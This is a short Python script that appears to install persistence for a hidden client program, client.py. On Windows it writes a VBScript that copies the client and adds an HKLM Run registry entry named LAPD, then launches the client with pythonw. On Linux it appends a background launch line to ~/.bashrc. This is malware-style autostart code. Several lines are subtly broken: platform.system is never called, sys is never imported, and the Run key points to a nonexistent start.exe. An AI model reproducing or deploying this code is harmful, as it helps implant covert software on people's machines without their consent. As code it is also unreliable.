#!/usr/bin/python3

from shutil import copyfile
import os,platform
from sys import exit
from pip._internal import main
def install(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        main(['install', package])

install("wget")
install("requests")
install("pathlib")
from pathlib import Path


if platform.system == "Windows":
    file = open("C:\\start.cmd","w")
    file.write("pythonw client.py")
    file.close()
    file = open("C:\\LAPD.vbs","w")
    file.write ("on error resume next \n")
    file.write ("set fso = CreateObject(\"Scripting.FileSystemObject\") \n")
    file.write ("fso.CopyFile \"client.py\",\"C:\\\"\n")
    file.write ("set reg = CreateObject(\"Wscript.Shell\")\n")
    file.write ("reg.RegWrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\LAPD\",\"C:\start.exe\"\n")
    file.close()
    os.system("start C:\\LAPD.vbs")
    os.system("pythonw client.py")
    sys.exit()
os.system("cp client.py ~/client.py")
file = open(str(Path.home())+"/.bashrc","a")
file.write("python3 client.py &")
os.system("python3 client.py &")
print("done")
